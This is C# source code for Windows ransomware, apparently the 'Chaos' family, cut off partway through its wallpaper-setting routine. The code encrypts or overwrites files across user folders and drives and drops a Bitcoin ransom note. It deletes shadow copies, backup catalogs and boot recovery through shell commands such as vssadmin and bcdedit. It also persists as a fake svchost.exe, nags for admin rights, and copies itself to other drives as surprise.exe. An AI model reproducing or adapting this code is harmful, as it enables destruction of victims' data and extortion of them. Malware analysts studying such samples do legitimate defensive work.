using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[9] { "----> Chaos is a multilingual ransomware. Translate your note into any language <----", "All your files have been encrypted", "Your computer has been infected with a ransomware virus. Your files have been encrypted and you will not be able to decrypt them ", "What can I do to recover my files?", "To begin with, there is no point in trying to decrypt your files because the encryption used to block access to your data is AES 256 bit the only solution would be to pay the ransom of 150 dollars if you don't want to pay your data will be lost forever and deleted moreover you have a delay of 1 week after having paid you will receive automatically the decryption key on the computer but it will be necessary to pay free to you to make as good as you want Good day(soiree)", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1q8hm78tfl4mkwzd4u9k7rfwzcmqm8d2v0f6g7qm", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>38TF0cf+cprxZmKYeY5FIXikNw3JMx6xMUQMYr/bKUPG4M0ck9IiQjc7MOLF3L+KfGsqkTKriY7f4gNv72XzmR/8VGP0Nvs/eyX/gsc6dY/3qo5HdxVFlBhkaTUcKb1Z6dtUelBSYsp5OMWX+knoo8joOdaw0aH4Wua8QzU7qF0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
